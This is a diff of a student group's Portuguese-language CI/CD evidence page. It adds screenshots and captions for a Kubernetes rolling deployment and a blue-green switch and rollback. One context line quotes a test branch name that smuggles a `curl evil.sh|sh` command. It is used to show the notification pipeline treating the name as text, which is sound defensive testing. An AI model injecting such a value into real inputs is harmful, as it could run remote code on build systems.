@@ -1,7 +1,8 @@
 # Evidências da entrega — Atividade 1 (CI)
 
-Capturas do pipeline de CI do grupo WJD em funcionamento, agrupadas pelo
-requisito que cada uma demonstra. A tabela *Evidências da entrega* do
+Capturas dos pipelines de CI e de CD do grupo WJD em funcionamento, agrupadas
+pelo requisito que cada uma demonstra. As da Atividade 1 seguem o nome
+`evidencia_NN_assunto.png`; as da Atividade 2, `NN-assunto.png`. A tabela *Evidências da entrega* do
 [README principal](../README.md#evidências-da-entrega) aponta para estas mesmas
 capturas a partir de cada item do enunciado.
 
@@ -24,6 +25,11 @@ capturas a partir de cada item do enunciado.
 | 15 | [evidencia_15_discord_falha.png](evidencia_15_discord_falha.png) | Notificação de falha e de recuperação |
 | — | [extras/sarif_upload_no_pr.png](extras/sarif_upload_no_pr.png) | Relatório do Trivy enviado também quando não há alerta |
 | — | [extras/injecao_neutralizada.png](extras/injecao_neutralizada.png) | Nome de branch malicioso chegando à notificação como texto |
+| CD 01 | [01-cd-rolling-deployment-sucesso.png](01-cd-rolling-deployment-sucesso.png) | Rolling Update concluído pelo workflow `cd.yml` |
+| CD 02 | [02-blue-green-pagina-web-blue.png](02-blue-green-pagina-web-blue.png) | Slot `blue` publicado e respondendo no host próprio |
+| CD 02 | [02-blue-green-pagina-web-green.png](02-blue-green-pagina-web-green.png) | Slot `green` publicado e respondendo no host próprio |
+| CD 03 | [03-blue-green-switch-producao.png](03-blue-green-switch-producao.png) | Produção servindo a cor `green` após o switch |
+| CD 04 | [04-blue-green-rollback-producao.png](04-blue-green-rollback-producao.png) | Produção de volta na cor `blue` após o rollback |
 
 ---
 
@@ -146,3 +152,36 @@ com o nome de branch `feat/x";curl evil.sh|sh;"`. O nome chegou ao Discord como
 texto: os valores entram no shell por `env:` e o JSON é montado com `jq`, então
 nada do conteúdo é interpretado como comando. Por ser um teste local, o link do
 card não aponta para um run existente.
+
+---
+
+## Entrega contínua no Kubernetes (Atividade 2)
+
+![Run do Rolling deployment concluído com sucesso](01-cd-rolling-deployment-sucesso.png)
+
+**CD 01 —** Run #1 do workflow *Rolling deployment*, disparado manualmente sobre
+o commit `cbcaa57`: o job `Deploy to kind` aplica o manifesto na EC2, espera o
+`rollout status` e faz o smoke test em `/healthz`. O aviso no painel de
+*Annotations* é o Node.js 20 do `actions/checkout@v4`, resolvido depois ao fixar
+a action por SHA, como no CI.
+
+![Slot blue respondendo em blue.todolist-bg.local](02-blue-green-pagina-web-blue.png)
+
+![Slot green respondendo em green.todolist-bg.local](02-blue-green-pagina-web-green.png)
+
+**CD 02 —** Os dois slots publicados, cada um no seu host: `blue.todolist-bg.local`
+e `green.todolist-bg.local`. A cor da interface vem do `APP_COLOR` de cada
+Deployment, o que torna visível qual versão está respondendo. Nesta etapa o
+tráfego de produção ainda não mudou.
+
+![Produção servindo a cor green](03-blue-green-switch-producao.png)
+
+**CD 03 —** Depois do switch, o host de produção `todolist-bg.local` passa a
+servir o slot `green`. O workflow altera apenas o `selector.color` do Service de
+produção: o Ingress e os hosts continuam iguais.
+
+![Produção de volta na cor blue](04-blue-green-rollback-producao.png)
+
+**CD 04 —** O rollback é o mesmo switch, apontando para a cor anterior. O slot
+`blue` nunca foi removido, então a volta é imediata e não depende de novo build
+nem de novo deploy.
